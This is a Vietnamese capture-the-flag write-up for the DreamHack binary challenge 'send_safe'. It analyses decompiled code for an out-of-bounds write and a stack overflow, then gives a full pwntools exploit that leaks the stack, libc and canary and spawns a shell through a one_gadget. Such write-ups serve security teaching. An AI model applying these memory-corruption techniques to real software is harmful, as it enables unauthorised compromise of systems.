# send_safe---Write-up-----DreamHack
Hướng dẫn cách giải bài Kind send_safe cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 1/10/2026

## 1. Mục tiêu
Đầu tiên là đọc code bài này và tìm bug

```C
unsigned __int64 sub_1491()
{
  pthread_t newthread; // [rsp+8h] [rbp-48h] BYREF
  __int64 v2[2]; // [rsp+10h] [rbp-40h]
  char buf[16]; // [rsp+20h] [rbp-30h] BYREF
  char src[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( ++qword_4050 == 0x7FFFFFFF )
  {
    puts("How did you run this 2147483647 times?\n");
    nbytes = 16LL;
  }
  puts("What's your name? : ");
  read(0, buf, nbytes);
  strncpy(arg, buf, (__int64)nbytes / 2);
  strncpy(&arg[(__int64)nbytes / 2], &buf[(__int64)nbytes / 2], (__int64)nbytes / 2);
  printf("Hello %s\n", buf);
  if ( qword_4060 )
  {
    puts("You already input your post code!");
  }
  else
  {
    puts("What is the post code where you live? : ");
    __isoc99_scanf("%lld", &qword_4058);
    if ( (unsigned int)sub_132E((unsigned int)qword_4058) )
    {
      puts("Your code is incorrect :(");
      exit(0);
    }
    puts("Where do you want to save your code?(1 or 2) : ");
    __isoc99_scanf("%lld", &qword_4060);
    v2[qword_4060 - 1] += qword_4058;        // OOB
    printf("This is your post code\n%lld %lld\n", v2[0], v2[1]);        // Leak Libc
  }
  puts("Write a letter\n> ");
  read(0, src, 0x30uLL);        // BOF
  strncpy(arg + 16, src, 0x30uLL);
  puts("Because privacy is important, I will remove second half of the names.");
  memset(&buf[(__int64)nbytes / 2], 0, (__int64)nbytes / 2);
  memset(&arg[(__int64)nbytes / 2], 0, (__int64)nbytes / 2);
  pthread_create(&newthread, 0LL, start_routine, arg);
  puts("Letter is also your privary, I will remove first half of the letter.");
  memset(src, 0, 0x19uLL);
  return v5 - __readfsqword(0x28u);
}
```

Giờ cần phải hiểu được cơ chế hoạt động của bài đã. Đầu tiên là cho ta nhập `buf` vào, ta sẽ leak được giá trị Stack. Sau đó nó sẽ hỏi muốn cộng trừ bao nhiêu vào vị trí nào trong mảng `v2`. Tại đây nó chỉ hỏi vị trí 1 hay 2 nhưng không hề kiểm tra mình có nhập số nào khác không dẫn tới **Out of Bound**. 

Cuối cùng là viết tâm tình vào 1 lá thư. Nó sẽ nhảy vào 1 hàm mã hóa hết tất cả dữ liệu sẽ được in ra.

```C
int __fastcall start_routine(_QWORD **a1)
{
  int i; // [rsp+1Ch] [rbp-34h]
  int j; // [rsp+20h] [rbp-30h]
  int k; // [rsp+24h] [rbp-2Ch]
  int m; // [rsp+28h] [rbp-28h]
  int v6; // [rsp+2Ch] [rbp-24h]
  char v7; // [rsp+30h] [rbp-20h]
  char *s; // [rsp+38h] [rbp-18h]

  v7 = 0;
  for ( i = 1; i <= 1001; ++i )
  {
    for ( j = 1; j <= 1001; ++j )
    {
      for ( k = 1; k <= 1001; ++k )
        v7 ^= k;
    }
  }
  s = (char *)(a1 + 2);
  if ( a1[1] )
    *a1[1] = *a1;
  v6 = strlen(s);
  for ( m = 0; m < v6; ++m )
    s[m] ^= v7;
  return printf("This is my amazing encrpytion's result!\n%s\n", s);
}
```

Muốn dịch ngược lại thì nhờ AI nha 🐧.

Bài này có 2 hướng giải quyết, 1 là leak được Canary sau đó quay lại main bằng **Buffer Overflow** 2147483647 lần để biến `nbytes` thành 16 byte sau đó leak PIE và chỉnh sửa `nbyte` lại thành 0 để thực hiện được **Write What Where** của bài. Khá là dài.

Còn cách 2 là leak Canary sau đó leak được Libc và quay lại main để **Buffer Overflow** bằng `one_gadget`. Cách 1 thì dài vcl nên mình chọn cách dễ nhất. Ok bắt tay vô thôi !

## 2. Cách thực thi
Đầu tiên là leak ở `buf`, tại buf thì không có giá trị gì ngoài Stack. Nhưng không sao, mình có thể tận dụng nó để bypass các điều kiện của `one_gadget`.

<img width="823" height="78" alt="image" src="https://github.com/user-attachments/assets/caa74de7-31d0-4329-9c75-a68e5e2835d0" />

```Python
p.sendafter(b"What's your name? : ", b'A' * 8)
p.recvuntil(b'A' * 8)

leak_stack = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Stack : {hex(leak_stack)}')
```

Tiếp theo là chúng ta sẽ sử dụng lỗi **OOB** để sửa RIP của thằng `sub_1491` để nó quay lại ban đầu, giúp chúng ta leak được Canary và ghi đè vào RIP bằng **BOF**.

<img width="741" height="57" alt="image" src="https://github.com/user-attachments/assets/33b890e6-433f-482d-9f76-5c4554de2e06" />

Tại `0x7fffffffdd08` là RIP của `sub_1491`, nếu ta trừ giá trị này đi 15 byte thì ta sẽ quay lại được về `main`.

<img width="705" height="207" alt="image" src="https://github.com/user-attachments/assets/d3a50c5e-6be5-4a44-abe8-c501a3f010d3" />

```Python
p.sendlineafter(b'What is the post code where you live? :', b'-15')
p.sendlineafter(b'Where do you want to save your code?(1 or 2) :', b'10')
```

Tiện thể thì ta cũng leak được Libc nhờ `printf("This is your post code\n%lld %lld\n", v2[0], v2[1]);`. Nó sẽ in ra giá trị tại 2 vị trí này dưới dạng `long long unsigned`.

<img width="943" height="75" alt="image" src="https://github.com/user-attachments/assets/8ae3563e-b34d-4208-8a9a-378bf6444c88" />

Bốc bừa 1 thằng cũng leak được Libc.

```Python
p.recvuntil(b'This is your post code\n')
leak_libc = int(p.recv(15))
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x21b6a0
log.success(f'Libc base : {hex(libc.address)}')
```

Cuối cùng thì ta sẽ leak Canary bằng cách ghi đè vào byte cuối của Canary. Khúc này các bạn không cần lo sẽ bị `stack smash` đâu. Bởi vì khi ta ghi đè vào, nó sẽ nhảy vào hàm mã hóa. Mã hóa xong xuôi hết nó sẽ in ra tất cả đến khi gặp byte null.

Sau khi làm xong hết nó sẽ `memset(src, 0, 0x19uLL);`, trùng hợp thật là nó vô tình `memset` luôn byte cuối của Canary từ đó không bị `stack smash`.

```Python
p.sendafter(b'> ', b'A' * 25)

p.recvuntil(b"result!\n")
leak_data = p.recv(32) 
encrypted_canary = leak_data[25:32]
decrypted_canary_bytes = bytes([b ^ 1 for b in encrypted_canary])
canary = u64(b'\x00' + decrypted_canary_bytes)

log.success(f"Leaked Canary: {hex(canary)}")
```

Sau khi quay lại `sub_1491` thì ta sẽ skip qua `buf` và tiến thẳng đến lỗi **BOF**. Lúc này ta sẽ tạo 1 payload như sau.

```Python
payload = b'A' * 24
payload += p64(canary)
payload += p64(leak_stack - 0x18)
payload += p64(libc.address + 0xebd43)

p.sendafter(b'> ', payload)
```

Khúc này Stack mà mình leak đã có tác dụng. Điều kiện của thằng `one_gadget` này yêu cầu 

<img width="930" height="151" alt="image" src="https://github.com/user-attachments/assets/6a69a1d3-8d5f-4cab-ae3c-44cb162b5720" />

Chúng ta không thể ghi đè RBP bằng rác mà phải địa chỉ thật, tiện thể thì nó phải là null luôn nên mình đã tính toán cẩn thận rồi.

Ok vậy là xong 1 bài gold 2, khá là dễ 🐧.

## 3. Exploit
```Python
from pwn import *

exe = ELF("prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process('./prob_patched')
# p = remote('host3.dreamhack.games', 10508)

p.sendafter(b"What's your name? : ", b'A' * 8)
p.recvuntil(b'A' * 8)

leak_stack = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Stack : {hex(leak_stack)}')

p.sendlineafter(b'What is the post code where you live? :', b'-15')
p.sendlineafter(b'Where do you want to save your code?(1 or 2) :', b'10')

p.recvuntil(b'This is your post code\n')
leak_libc = int(p.recv(15))
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x21b6a0
log.success(f'Libc base : {hex(libc.address)}')

p.sendafter(b'> ', b'A' * 25)

p.recvuntil(b"result!\n")
leak_data = p.recv(32) 
encrypted_canary = leak_data[25:32]
decrypted_canary_bytes = bytes([b ^ 1 for b in encrypted_canary])
canary = u64(b'\x00' + decrypted_canary_bytes)

log.success(f"Leaked Canary: {hex(canary)}")

p.send(b'A' * 8)

payload = b'A' * 24
payload += p64(canary)
payload += p64(leak_stack - 0x18)
payload += p64(libc.address + 0xebd43)

p.sendafter(b'> ', payload)

p.interactive()
```



